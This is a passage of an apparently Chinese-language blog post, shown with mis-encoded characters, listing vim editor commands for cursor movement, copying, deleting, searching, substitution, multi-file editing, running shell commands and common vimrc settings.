    <content type="html"><![CDATA[<h2 id="vimä½¿ç”¨æŠ€å·§"><a href="#vimä½¿ç”¨æŠ€å·§" class="headerlink" title="vimä½¿ç”¨æŠ€å·§"></a>vimä½¿ç”¨æŠ€å·§</h2><h3 id="ç§»åŠ¨å…‰æ ‡"><a href="#ç§»åŠ¨å…‰æ ‡" class="headerlink" title="ç§»åŠ¨å…‰æ ‡"></a>ç§»åŠ¨å…‰æ ‡</h3><hr><ul><li>å•è¡Œç§»åŠ¨</li></ul><table><thead><tr><th>w</th><th>ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´</th></tr></thead><tbody><tr><td>W</td><td>ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´ï¼Œé•¿è·³ï¼æ¯”å¦‚ï¼etc/letsencryt è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå•è¯</td></tr><tr><td>e</td><td>ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯ç»“å°¾</td></tr><tr><td>E</td><td>ç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªå•è¯ç»“å°¾,é•¿è·³</td></tr><tr><td>b</td><td>ç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€ä¸ªå•è¯</td></tr><tr><td>B</td><td>ç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€ä¸ªå•è¯,é•¿è·³</td></tr><tr><td>nw</td><td>nä»£è¡¨æ•°å­—,æ¯”å¦‚ç§»åŠ¨åˆ°ä¸‹5ä¸ªå•è¯çš„å¤´éƒ¨,5w</td></tr><tr><td>ne</td><td>nä»£è¡¨æ•°å­—,æ¯”å¦‚ç§»åŠ¨åˆ°ä¸‹5ä¸ªå•è¯çš„å°¾éƒ¨,5e</td></tr></tbody></table><a id="more"></a><ul><li>è¡Œé¦–è¡Œå°¾ç§»åŠ¨</li></ul><table><thead><tr><th>0</th><th>æ•°å­—0,è¡¨ç¤ºç§»åŠ¨åˆ°æœ¬è¡Œæœ€å¼€å¤´,ä¸ç®¡æœ‰æ²¡æœ‰ç¼©è¿›éƒ½è·³åˆ°æœ€å¼€å¤´,ä½œç”¨ç­‰ç”¨äºHomeé”®</th></tr></thead><tbody><tr><td>^</td><td>ç§»åŠ¨å…‰æ ‡åˆ°æœ¬è¡Œæœ€å¼€å¤´çš„å­—ç¬¦å¤„</td></tr><tr><td>$</td><td>ç§»åŠ¨åˆ°æœ¬è¡Œç»“å°¾å¤„.ä½œç”¨ç­‰åŒäºEndé”®</td></tr></tbody></table><ul><li>å±å¹•ä¸­ç§»åŠ¨</li></ul><table><thead><tr><th>H</th><th>ç§»åŠ¨å…‰æ ‡åˆ°å±å¹•çš„é¦–è¡Œ.æ³¨æ„æ˜¯å½“å‰å±å¹•çª—å£,è€Œä¸æ˜¯æ•´ä¸ªæ–‡ä»¶.</th></tr></thead><tbody><tr><td>M</td><td>ç§»åŠ¨å…‰æ ‡åˆ°å±å¹•çš„ä¸­é—´ä¸€è¡Œ.</td></tr><tr><td>L</td><td>ç§»åŠ¨å…‰æ ‡åˆ°å±å¹•çš„å°¾è¡Œ.</td></tr></tbody></table><ul><li>æ–‡ä»¶èŒƒå›´ç§»åŠ¨</li></ul><table><thead><tr><th>gg</th><th>ç§»åŠ¨å…‰æ ‡åˆ°æ–‡ä»¶é¦–è¡Œ.è¿™ä¸ªæ˜¯ç§»åŠ¨åˆ°æ•´ä¸ªæ–‡ä»¶çš„ç¬¬ä¸€è¡Œ</th></tr></thead><tbody><tr><td>G</td><td>ç§»åŠ¨å…‰æ ‡åˆ°æ–‡ä»¶çš„æœ€åä¸€è¡Œ. è¿™ä¸ªæ˜¯ç§»åŠ¨åˆ°æ•´ä¸ªæ–‡ä»¶çš„æœ€åä¸€è¡Œ</td></tr><tr><td>:n</td><td>è·³åˆ°ç¬¬nè¡Œ.æ¯”å¦‚è·³åˆ°ç¬¬5è¡Œ,å¯ä»¥è¾“å…¥:5</td></tr><tr><td>nGæˆ–ngg</td><td>ä¹Ÿæ˜¯è·³åˆ°nè¡Œ,æ¯”å¦‚è·³åˆ°ç¬¬10è¡Œ,è¾“å…¥10G,æˆ–è€…10gg</td></tr><tr><td>:n</td><td>nä»£è¡¨æ•°å­—,æ¯”å¦‚ç§»åŠ¨åˆ°100è¡Œ,è¾“å…¥:100</td></tr></tbody></table><ul><li>ç¿»é¡µ</li></ul><table><thead><tr><th>ctrl+f</th><th>å‘ä¸‹ç¿»é¡µ,ç­‰åŒäºpage down</th></tr></thead><tbody><tr><td>ctrl+b</td><td>å‘ä¸Šç¿»é¡µ,ç­‰åŒäºpage up</td></tr><tr><td>ctrl+d</td><td>å‘ä¸‹ç¿»åŠé¡µ</td></tr><tr><td>ctrl+u</td><td>å‘ä¸Šç¿»åŠé¡µ</td></tr></tbody></table><ul><li>ç‰¹æ®Šç§»åŠ¨æŠ€å·§</li></ul><table><thead><tr><th>{</th><th>è·³åˆ°ä¸Šä¸€ä¸ªç©ºè¡Œ</th></tr></thead><tbody><tr><td>}</td><td>è·³åˆ°ä¸‹ä¸€ä¸ªç©ºè¡Œ</td></tr><tr><td>*</td><td>å°†å…‰æ ‡åœç•™åœ¨æŸä¸ªå•è¯ä¸Šï¼ŒæŒ‰ä¸‹ï¼Šé”®ï¼Œä¼šæœç´¢è¯¥å•è¯ï¼Œå¹¶è·³åˆ°ä¸‹ä¸€ä¸ªè¿™ä¸ªå•è¯å¤„</td></tr><tr><td>#</td><td>å°†å…‰æ ‡åœç•™åœ¨æŸä¸ªå•è¯ä¸Šï¼ŒæŒ‰ä¸‹#é”®ï¼Œä¼šæœç´¢è¯¥å•è¯ï¼Œå¹¶è·³åˆ°ä¸Šä¸€ä¸ªè¿™ä¸ªå•è¯å¤„</td></tr><tr><td>â€˜â€™</td><td>ä¸¤ä¸ªå•å¼•å·,ç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€ä¸ªæ ‡è®°å¤„.æ¯”å¦‚è·³è½¬åˆ°ä»–å¤„å,è¾“å…¥æ­¤å‘½ä»¤å›åˆ°ä¸Šä¸€æ¬¡å…‰æ ‡åœç•™çš„ä½ç½®</td></tr><tr><td>â€˜.</td><td>ä¸€ä¸ªå•å¼•å·ä¸€ä¸ªç‚¹ï¼Œç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€æ¬¡çš„ä¿®æ”¹è¡Œ</td></tr><tr><td>`.</td><td>ä¸€ä¸ªå€’å¼•å·ä¸€ä¸ªç‚¹ï¼ç§»åŠ¨å…‰æ ‡åˆ°ä¸Šä¸€æ¬¡çš„ä¿®æ”¹ç‚¹</td></tr></tbody></table><hr><h3 id="åˆ é™¤å¤åˆ¶â€”ç»“åˆå…‰æ ‡"><a href="#åˆ é™¤å¤åˆ¶â€”ç»“åˆå…‰æ ‡" class="headerlink" title="åˆ é™¤å¤åˆ¶â€”ç»“åˆå…‰æ ‡"></a>åˆ é™¤å¤åˆ¶â€”ç»“åˆå…‰æ ‡</h3><p>åœ¨vimä¸­,yè¡¨ç¤ºæ‹·è´,dè¡¨ç¤ºåˆ é™¤,pè¡¨ç¤ºç²˜è´´.å…¶ä¸­æ‹·è´å’Œåˆ é™¤å’Œå…‰æ ‡ç§»åŠ¨å‘½ä»¤å¯ä»¥ç»“åˆä½¿ç”¨</p><ul><li>åˆ é™¤</li></ul><table><thead><tr><th>dw</th><th>wæ˜¯ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªå•è¯å¼€å¤´ï¼dwè¡¨ç¤ºåˆ é™¤ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨å•è¯ç»“å°¾çš„å†…å®¹</th></tr></thead><tbody><tr><td>dW</td><td>åŒä¸Šï¼Œä¸è¿‡æ˜¯é•¿åˆ é™¤, /etc/letsencryptè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªå•è¯</td></tr><tr><td>daw</td><td>åˆ é™¤å…‰æ ‡æ‰€åœ¨çš„å•è¯,æ— è®ºå…‰æ ‡æ˜¯åœç•™åœ¨å“ªé‡Œ.ä¾‹å¦‚/etc/letsencrypt/.å¦‚æœå…‰æ ‡åœç•™åœ¨letsencryptä¸­çš„tå­—æ¯ä¸Š,åˆ™ä¼šåˆ é™¤letsencryptè¿™ä¸ªå•è¯.å¦‚æœæ˜¯dwåˆ™åªåˆ é™¤tsencrypt,ä¿ç•™le</td></tr><tr><td>daW</td><td>åŒä¸Šï¼Œé•¿åˆ é™¤</td></tr><tr><td>d0</td><td>æ•°å­—0,åˆ é™¤ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨è¡Œé¦–çš„å†…å®¹</td></tr><tr><td>d$æˆ–dD</td><td>åˆ é™¤ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨è¡Œå°¾çš„å†…å®¹</td></tr></tbody></table><ul><li>å¤åˆ¶</li></ul><table><thead><tr><th>yw</th><th>åŒç†,å¤åˆ¶ä»å…‰æ ‡æ‰€åœ¨å­—æ¯åˆ°å•è¯ç»“å°¾çš„å†…å®¹</th></tr></thead><tbody><tr><td>yW</td><td>åŒä¸Š,é•¿å¤åˆ¶</td></tr><tr><td>yaw/yaW</td><td>åŒç†ï¼Œå¤åˆ¶å•è¯ï¼Œæ— è®ºå…‰æ ‡åœç•™åœ¨å•è¯çš„å“ªä¸ªå­—æ¯</td></tr><tr><td>y0</td><td>æ‹·è´ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨è¡Œé¦–çš„å†…å®¹ï¼Œå¦‚æœè¯¥è¡Œç¼©è¿›ï¼Œé‚£ä¹ˆè¿è¡Œé¦–çš„ç©ºæ ¼ä¹Ÿä¸€èµ·å¤åˆ¶</td></tr><tr><td>ï½™^</td><td>æ‹·è´ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨è¡Œé¦–çš„å†…å®¹ï¼Œå¦‚æœè¯¥è¡Œç¼©è¿›ï¼Œä¸åŒ…æ‹¬è¡Œé¦–ç©ºæ ¼ï¼Œ</td></tr><tr><td>y$</td><td>æ‹·è´ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨è¡Œå°¾çš„å†…å®¹</td></tr></tbody></table><ul><li>æ•´è¡Œå¤åˆ¶åˆ é™¤</li></ul><table><thead><tr><th>yy</th><th>å¤åˆ¶å…‰æ ‡æ‰€åœ¨æ•´è¡Œå†…å®¹</th></tr></thead><tbody><tr><td>dd</td><td>åˆ é™¤å…‰æ ‡æ‰€åœ¨æ•´è¡Œå†…å®¹</td></tr><tr><td>D</td><td>åˆ é™¤ä»å½“å‰å…‰æ ‡åˆ°å…‰æ ‡æ‰€åœ¨è¡Œå°¾çš„å†…å®¹</td></tr><tr><td>J</td><td>è¡¨ç¤ºå…‰æ ‡æ‰€åœ¨è¡Œå’Œä¸‹ä¸€è¡Œåˆå¹¶</td></tr><tr><td>:.,$d</td><td>åˆ é™¤å½“å‰è¡Œåˆ°æ–‡ä»¶æœ«å°¾,</td></tr><tr><td>dG</td><td>åˆ é™¤å½“å‰è¡Œåˆ°æ–‡ä»¶æœ«å°¾,</td></tr><tr><td>:/str1/,/str2/d</td><td>åˆ é™¤ä»å­—ç¬¦ä¸²str1åˆ°str2çš„æ‰€æœ‰è¡Œ</td></tr></tbody></table><hr><h3 id="åˆ é™¤å¤åˆ¶â€”ç»“åˆæ•°å­—"><a href="#åˆ é™¤å¤åˆ¶â€”ç»“åˆæ•°å­—" class="headerlink" title="åˆ é™¤å¤åˆ¶â€”ç»“åˆæ•°å­—"></a>åˆ é™¤å¤åˆ¶â€”ç»“åˆæ•°å­—</h3><table><thead><tr><th>5yyæˆ–è€…y5y</th><th>æ‹·è´å…‰æ ‡ä»¥ä¸‹5è¡Œ,åŒ…å«å…‰æ ‡æ‰€åœ¨è¡Œæœ¬èº«</th></tr></thead><tbody><tr><td>:n1,n2y</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:12,24yè¡¨ç¤ºæ‹·è´ç¬¬12è¡Œåˆ°ç¬¬24è¡Œçš„å†…å®¹.</td></tr><tr><td>:n,y</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:12,yè¡¨ç¤ºæ‹·è´ç¬¬12è¡Œåˆ°å…‰æ ‡æ‰€åœ¨è¡Œä¹‹é—´çš„å†…å®¹.</td></tr><tr><td>:,ny</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:,24yè¡¨ç¤ºæ‹·è´å…‰æ ‡æ‰€åœ¨è¡Œåˆ°ç¬¬24è¡Œä¹‹é—´çš„å†…å®¹.</td></tr></tbody></table><table><thead><tr><th>5ddæˆ–è€…d5d</th><th>åˆ é™¤å…‰æ ‡ä»¥ä¸‹5è¡Œ,åŒ…å«å…‰æ ‡æ‰€åœ¨è¡Œæœ¬èº«</th></tr></thead><tbody><tr><td>:n1,n2d</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:12,24dè¡¨ç¤ºåˆ é™¤ç¬¬12è¡Œåˆ°ç¬¬24è¡Œçš„å†…å®¹.</td></tr><tr><td>:n,d</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:12,dè¡¨ç¤ºåˆ é™¤ç¬¬12è¡Œåˆ°å…‰æ ‡æ‰€åœ¨è¡Œä¹‹é—´çš„å†…å®¹.</td></tr><tr><td>:,nd</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:,24dè¡¨ç¤ºåˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œåˆ°ç¬¬24è¡Œä¹‹é—´çš„å†…å®¹.</td></tr><tr><td>:nd</td><td>nè¡¨ç¤ºæ•°å­—,ä¾‹å¦‚:3dè¡¨ç¤ºåˆ é™¤3è¡Œ.æ³¨æ„å’Œä¸Šä¸ªå‘½ä»¤åŒºåˆ†</td></tr></tbody></table><hr><h3 id="æŸ¥æ‰¾"><a href="#æŸ¥æ‰¾" class="headerlink" title="æŸ¥æ‰¾"></a>æŸ¥æ‰¾</h3><table><thead><tr><th>/xxxæˆ–è€…?xxx</th><th>åœ¨æ•´ç¯‡æ–‡æ¡£ä¸­æœç´¢åŒ¹é…xxxçš„å­—ç¬¦ä¸², / è¡¨ç¤ºå‘ä¸‹æŸ¥æ‰¾, ? è¡¨ç¤ºå‘ä¸ŠæŸ¥æ‰¾.æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼.è¾“å…¥ n æŸ¥æ‰¾ä¸‹ä¸€ä¸ªåŒ¹é…å¤„, è¾“å…¥ N åæ–¹å‘æŸ¥æ‰¾.æ³¨æ„æŸ¥æ‰¾å­—ç¬¦ä¸²é»˜è®¤åŒºåˆ†å¤§å°å†™</th></tr></thead><tbody><tr><td>*æˆ–è€…#</td><td>å…‰æ ‡åœç•™åœ¨æŸä¸ªå•è¯ä¸Šæ—¶, è¾“å…¥è¿™æ¡å‘½ä»¤è¡¨ç¤ºæŸ¥æ‰¾ä¸è¯¥å•è¯åŒ¹é…çš„ä¸‹(ä¸Š)ä¸€ä¸ªå•è¯,åŒæ ·,è¾“å…¥næŸ¥æ‰¾ä¸‹ä¸€ä¸ªåŒ¹é…,è¾“å…¥Nåæ–¹å‘æŸ¥æ‰¾</td></tr><tr><td>g*æˆ–è€…g#</td><td>å’Œä¸Šæ¡ç›¸ä¼¼,ä½†æ˜¯è¿™ä¸ªå‘½ä»¤ä¸å®Œå…¨åŒ¹é…å…‰æ ‡æ‰€åœ¨å¤„çš„å•è¯,è€Œæ˜¯åŒ¹é…åŒ…å«è¯¥å•è¯çš„æ‰€æœ‰å­—ç¬¦ä¸²</td></tr><tr><td>gd</td><td>æŸ¥æ‰¾ä¸å…‰æ ‡æ‰€åœ¨å•è¯ç›¸åŒ¹é…çš„å•è¯, å¹¶å°†å…‰æ ‡åœç•™åœ¨æ–‡æ¡£çš„éæ³¨é‡Šæ®µä¸­ç¬¬ä¸€æ¬¡å‡ºç°è¿™ä¸ªå•è¯çš„åœ°æ–¹. ç”¨äºæŸ¥æ‰¾å±€éƒ¨å˜é‡ç­‰</td></tr><tr><td>%</td><td>æŸ¥æ‰¾ä¸å…‰æ ‡æ‰€åœ¨å¤„ç›¸åŒ¹é…çš„åæ‹¬å·, åŒ…æ‹¬ () [] { }</td></tr></tbody></table><hr><h3 id="æ›¿æ¢"><a href="#æ›¿æ¢" class="headerlink" title="æ›¿æ¢"></a>æ›¿æ¢</h3><p>ä¸€èˆ¬ç»“åˆså’Œgå‘½ä»¤è¿›è¡Œæ›¿æ¢.ä¸€èˆ¬æ ¼å¼ä¸º:  </p><p>:%s/åŒ¹é…æ¨¡å¼/æ›¿æ¢åçš„å­—ç¬¦ä¸²/g.å…¶ä¸­æ¨¡å¼å¯ä»¥æ˜¯æ­£åˆ™è¡¨è¾¾å¼,ä»¥ä¸‹æ˜¯å‡ ä¸ªä¾‹å­</p><table><thead><tr><th>:s/aa/bb/g</th><th>å°†å…‰æ ‡æ‰€åœ¨è¡Œå‡ºç°çš„æ‰€æœ‰åŒ…å« aa çš„å­—ç¬¦ä¸²ä¸­çš„ aa æ›¿æ¢ä¸º bb.æ³¨æ„æ˜¯å…‰æ ‡æ‰€åœ¨è¡Œ,ä¸æ˜¯å…¨æ–‡ä»¶</th></tr></thead><tbody><tr><td>:%s/aa/bb/g</td><td>å°†æ–‡æ¡£ä¸­å‡ºç°çš„æ‰€æœ‰åŒ…å« aa çš„å­—ç¬¦ä¸²ä¸­çš„ aa æ›¿æ¢ä¸º bb.æ–‡ä»¶å…¨å±€ç”Ÿæ•ˆ</td></tr><tr><td>:12,23s/aa/bb/g</td><td>å°†ä»12è¡Œåˆ°23è¡Œä¸­å‡ºç°çš„æ‰€æœ‰åŒ…å« aa çš„å­—ç¬¦ä¸²ä¸­çš„ aa æ›¿æ¢ä¸º bb</td></tr><tr><td>:12,23s/^/#/</td><td>å°†ä»12è¡Œåˆ°23è¡Œçš„è¡Œé¦–åŠ å…¥ # å­—ç¬¦</td></tr><tr><td>:s/^/#/g</td><td>å…¨å±€æ‰€æœ‰è¡Œé¦–æ’å…¥#å­—ç¬¦</td></tr></tbody></table><blockquote><p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å¯ä»¥æ‰¹é‡åœ¨è¡Œé¦–æ’å…¥å­—ç¬¦:</p></blockquote><p>1.ctrl+væ‰¹é‡é€‰ä¸­è¦æ’å…¥çš„è¡Œ</p><p>2.æŒ‰å¤§å†™å­—æ¯I,è¾“å…¥è¦æ’å…¥çš„å­—ç¬¦</p><p>3.è¿ç»­æŒ‰ä¸¤æ¬¡ESCé”®</p><table><thead><tr><th>:%s/\s+$//</th><th>å°†æ‰€æœ‰è¡Œå°¾å¤šä½™çš„ç©ºæ ¼åˆ é™¤.ç­‰åŒäºâ€:%s= *$==â€</th></tr></thead><tbody><tr><td>:g/^\s*$/d</td><td>å°†æ‰€æœ‰ç©ºè¡Œåˆ é™¤</td></tr><tr><td>:g/^\/\//d</td><td>å°†æ‰€æœ‰//å¼€å¤´çš„è¡Œæ•´è¡Œåˆ é™¤.(ä¸ä»…ä»…æ˜¯åˆ é™¤//)</td></tr></tbody></table><blockquote><p>sé…åˆgä¸€èˆ¬ç”¨æ¥åšæ›¿æ¢,gå•ç‹¬ä½¿ç”¨ä¸€èˆ¬ç”¨æ¥åˆ é™¤åŒ¹é…çš„è¡Œ</p></blockquote><hr><h3 id="ç¼–è¾‘"><a href="#ç¼–è¾‘" class="headerlink" title="ç¼–è¾‘"></a>ç¼–è¾‘</h3><table><thead><tr><th>cc</th><th>åˆ é™¤å½“å‰è¡Œå¹¶è¿›å…¥ç¼–è¾‘æ¨¡å¼</th></tr></thead><tbody><tr><td>cw</td><td>åˆ é™¤å½“å‰å­—ï¼Œå¹¶è¿›å…¥ç¼–è¾‘æ¨¡å¼</td></tr><tr><td>c$</td><td>æ“¦é™¤ä»å½“å‰ä½ç½®è‡³è¡Œæœ«çš„å†…å®¹ï¼Œå¹¶è¿›å…¥ç¼–è¾‘æ¨¡å¼</td></tr><tr><td>S</td><td>åˆ é™¤å…‰æ ‡æ‰€åœ¨è¡Œå¹¶è¿›å…¥ç¼–è¾‘æ¨¡å¼</td></tr><tr><td>s</td><td>åˆ é™¤å½“å‰å­—ç¬¦å¹¶è¿›å…¥ç¼–è¾‘æ¨¡å¼</td></tr><tr><td>u</td><td>æ’¤é”€</td></tr><tr><td>ctrl+r</td><td>æ’¤é”€ä¸Šä¸€ä¸ªæ’¤é”€.</td></tr><tr><td>~</td><td>å°†å…‰æ ‡å½“å‰é€‰ä¸­çš„å­—ç¬¦åˆ‡æ¢å¤§å°å†™</td></tr><tr><td>&gt;&gt;</td><td>å½“å‰è¡Œå³ç§»ä¸€ä¸ªtab</td></tr><tr><td>&lt;&lt;</td><td>å½“å‰è¡Œå·¦ç§»ä¸€ä¸ª tab</td></tr><tr><td>5&gt;&gt;</td><td>å½“å‰å…‰æ ‡å5 è¡Œå‘å³ç§»åŠ¨ä¸€ä¸ª tab.</td></tr><tr><td>:12,24&gt;</td><td>å°†12è¡Œåˆ°14è¡Œçš„æ•°æ®éƒ½å‘å³ç§»åŠ¨ä¸€ä¸ª tab</td></tr><tr><td>:12,24&gt;&gt;</td><td>å°†12è¡Œåˆ°14è¡Œçš„æ•°æ®éƒ½å‘å³ç§»åŠ¨ä¸¤ä¸ª tab</td></tr><tr><td>:w filename</td><td>å°†å½“å‰æ–‡ä»¶æ‰€æœ‰å†…å®¹å†™å…¥æ–°æ–‡ä»¶</td></tr><tr><td>:5w filenmame</td><td>å°†å½“å‰æ–‡ä»¶ç¬¬5è¡Œå†…å®¹å†™å…¥æ–°æ–‡ä»¶</td></tr><tr><td>:1,10w filename</td><td>å°†å½“å‰æ–‡ä»¶ç¬¬1åˆ°ç¬¬10è¡Œå†…å®¹å†™å…¥æ–°æ–‡ä»¶</td></tr><tr><td>:f filename</td><td>å°†å½“å‰æ–‡ä»¶é‡å‘½åä¸ºæ–°æ–‡ä»¶</td></tr></tbody></table><hr><h3 id="å¤šæ–‡ä»¶ç¼–è¾‘"><a href="#å¤šæ–‡ä»¶ç¼–è¾‘" class="headerlink" title="å¤šæ–‡ä»¶ç¼–è¾‘"></a>å¤šæ–‡ä»¶ç¼–è¾‘</h3><table><thead><tr><th>vim file1 file2 â€¦</th><th>åŒæ—¶æ‰“å¼€å¤šä¸ªæ–‡ä»¶è¿›è¡Œç¼–è¾‘</th></tr></thead><tbody><tr><td>:n\:N (ç­‰åŒäº:next\:prev)</td><td>è¿›å…¥ä¸‹ä¸€ä¸ªæ–‡ä»¶(ä¸Šä¸€ä¸ªæ–‡ä»¶)ç¼–è¾‘.è¿™ä¸ªå‘½ä»¤è¦æ±‚å…ˆä¿å­˜å½“å‰ç¼–è¾‘æ–‡ä»¶</td></tr><tr><td>:n!\:N!</td><td>ä¸ä¿å­˜å½“å‰ç¼–è¾‘æ–‡ä»¶,å¹¶ä¸”åˆ‡æ¢åˆ°ä¸‹(ä¸Š)æ–‡ä»¶ç¼–è¾‘.</td></tr><tr><td>:wn\wN</td><td>ä¿å­˜å½“å‰ç¼–è¾‘æ–‡ä»¶,å¹¶ä¸”åˆ‡æ¢åˆ°ä¸‹(ä¸Š)æ–‡ä»¶ç¼–è¾‘</td></tr><tr><td>ctrl+^</td><td>åœ¨æœ€è¿‘æ‰“å¼€çš„2ä¸ªæ–‡ä»¶ä¹‹é—´å¿«é€Ÿåˆ‡æ¢</td></tr><tr><td>:e æ–‡ä»¶å</td><td>æŒ‡å®šå¯¹æŸä¸ªæ–‡ä»¶è¿›è¡Œç¼–è¾‘</td></tr><tr><td>:sp [file]</td><td>æŠŠå½“å‰æ–‡ä»¶æˆ–è€…æŒ‡å®šæ–‡ä»¶æ°´å¹³åˆ†éš”</td></tr><tr><td>:vsp [file]</td><td>æŠŠå½“å‰æ–‡ä»¶æˆ–è€…æŒ‡å®šæ–‡ä»¶å‚ç›´åˆ†éš”</td></tr><tr><td>:q\:close</td><td>å…³é—­å½“å‰æ–‡ä»¶çª—å£</td></tr><tr><td>:only</td><td>åªä¿ç•™å½“å‰æ–‡ä»¶çª—å£,å…³é—­å…¶ä»–æ‰€æœ‰çª—å£</td></tr><tr><td>:[q\</td><td>wq]all</td><td>å¯¹æ‰€æœ‰çª—å£æ‰§è¡Œqæˆ–è€…wqæ“ä½œ</td></tr><tr><td>:[q\</td><td>wq]all!</td><td>å¯¹æ‰€æœ‰çª—å£æ‰§è¡Œq!æˆ–è€…wq!æ“ä½œ</td></tr><tr><td>:vertical all</td><td>æ‰“å¼€æ‰€æœ‰çª—å£,å‚ç›´æ‰“å¼€</td></tr><tr><td>ctrl+w  w</td><td>vimåˆ†éš”äº†å¤šä¸ªçª—å£å,å…‰æ ‡å¾ªç¯å®šä½åˆ°å„ä¸ªçª—å£ä¸­</td></tr><tr><td>ctrl+w h/i</td><td>vimåˆ†éš”äº†å¤šä¸ªçª—å£å,å…‰æ ‡è·³è½¬åˆ°å·¦è¾¹(å³è¾¹)çš„çª—å£</td></tr><tr><td>ctrl+w j/k</td><td>vimåˆ†éš”äº†å¤šä¸ªçª—å£å,å…‰æ ‡è·³è½¬åˆ°ä¸Šè¾¹(ä¸‹è¾¹)çš„çª—å£</td></tr><tr><td>ctrl+W =</td><td>è®©æ‰€æœ‰vimåˆ†éš”åçš„å¤šä¸ªçª—å£é«˜åº¦ä¿æŒä¸€æ ·</td></tr><tr><td>ctrl+W +/-</td><td>å¢åŠ /å‡å°‘vimå½“å‰çª—å£é«˜åº¦</td></tr></tbody></table><hr><h3 id="æ‰§è¡Œå¤–éƒ¨shellå‘½ä»¤"><a href="#æ‰§è¡Œå¤–éƒ¨shellå‘½ä»¤" class="headerlink" title="æ‰§è¡Œå¤–éƒ¨shellå‘½ä»¤"></a>æ‰§è¡Œå¤–éƒ¨shellå‘½ä»¤</h3><table><thead><tr><th>:! command</th><th>è¿™æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ‰§è¡Œå‘½ä»¤æ–¹å¼,æ¯”å¦‚ :!ls æ˜¾ç¤ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶.æ‰§è¡Œå®Œå‘½ä»¤åæŒ‰å›è½¦è¿”å›vimç¼–è¾‘çª—å£</th></tr></thead><tbody><tr><td>:r! command</td><td>æ¯”å¦‚:r!ls.å’Œä¸Šé¢çš„å‘½ä»¤ç±»ä¼¼,ä½†æ˜¯æ‰§è¡Œå®Œçš„ç»“æœä¼šä¿å­˜åœ¨vimçš„ç¼“å­˜ä¸­,ä¸€ç›´æ˜¾ç¤ºåœ¨å½“å‰vimç¼–è¾‘çª—å£</td></tr></tbody></table><hr><h3 id="å¸¸ç”¨åŠŸèƒ½é€‰é¡¹"><a href="#å¸¸ç”¨åŠŸèƒ½é€‰é¡¹" class="headerlink" title="å¸¸ç”¨åŠŸèƒ½é€‰é¡¹"></a>å¸¸ç”¨åŠŸèƒ½é€‰é¡¹</h3><p>åœ¨å¯åŠ¨çš„æ—¶å€™vimä¼šè¯»å– /etc/vimrc å’Œ ~/.vimrc ( å…¨å±€è®¾ç½®çš„vimrc å’Œç”¨æˆ·è®¾ç½®).ä¸‹é¢è¿™äº›å¸¸è§çš„åŠŸèƒ½é€‰é¡¹å¯ä»¥ç›´æ¥å®šä¹‰åœ¨vimrcæ–‡ä»¶é‡Œ,ä¹Ÿå¯ä»¥åœ¨vimç¼–è¾‘çª—å£ä¸­è¾“å…¥: set xxxæ‰§è¡Œ.</p><p>å¸¸è§çš„åŠŸèƒ½é€‰é¡¹æœ‰:</p><table><thead><tr><th>:set nu/:set nonu</th><th>æ˜¾ç¤º/å–æ¶ˆè¡Œå·.nuæ˜¯numberçš„ç¼©å†™</th></tr></thead><tbody><tr><td>:set ic/set noic</td><td>æ˜¾ç¤º/å¿½ç•¥å¤§å°å†™.icæ˜¯ignorecaceçš„ç¼©å†™</td></tr><tr><td>:set ai/set noai</td><td>è‡ªåŠ¨/ä¸è‡ªåŠ¨ç¼©è¿›.aiæ˜¯aotuindentç¼©å†™</td></tr><tr><td>:set hlsearch/:set nohlsearch</td><td>æ˜¾ç¤º/ä¸æ˜¾ç¤ºé«˜äº®.</td></tr><tr><td>:syntax on / :syntax off</td><td>è¯­æ³•é«˜äº®/å…³é—­è¯­æ³•é«˜äº®</td></tr><tr><td>set tabstop=4</td><td>è®¾ç½®tabé”®ä¸º4ä¸ªç©ºæ ¼</td></tr><tr><td>set ruler</td><td>åœ¨å³ä¸‹è§’æ˜¾ç¤ºå…‰æ ‡ä½ç½®çš„çŠ¶æ€è¡Œ</td></tr><tr><td>set incsearch</td><td>æŸ¥è¯¢çš„æ—¶å€™éå¸¸æ–¹ä¾¿.æ¯”å¦‚æœç´¢bookå•è¯.è¾“å…¥/boæ—¶,å°±å·²ç»è‡ªåŠ¨å¼€å§‹æŸ¥æ‰¾.</td></tr><tr><td>set noswapfile</td><td>ä¸è¦äº¤æ¢æ–‡ä»¶</td></tr></tbody></table><hr><h3 id="ç²˜è´´é¿å…ç¼©è¿›"><a href="#ç²˜è´´é¿å…ç¼©è¿›" class="headerlink" title="ç²˜è´´é¿å…ç¼©è¿›"></a>ç²˜è´´é¿å…ç¼©è¿›</h3><p>1.åœ¨ç²˜è´´ä¹‹å‰,vimçª—å£ä¸­è¾“å…¥:set paste 